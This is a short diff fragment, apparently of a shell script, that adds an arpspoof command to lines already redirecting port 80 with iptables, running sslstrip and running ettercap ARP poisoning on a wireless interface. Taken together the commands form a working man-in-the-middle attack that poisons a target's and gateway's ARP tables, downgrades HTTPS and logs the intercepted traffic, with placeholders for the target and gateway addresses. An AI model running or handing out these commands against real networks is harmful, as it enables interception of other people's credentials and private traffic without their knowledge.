@@ -22,5 +22,6 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
 sslstrip -a -f -l 8080 -w ssl
 ettercap -T -q -i wlan0 -M arp ////
 
+arpspoof -i wlan0 -t TargetIP -r GatewayIP
 
 }
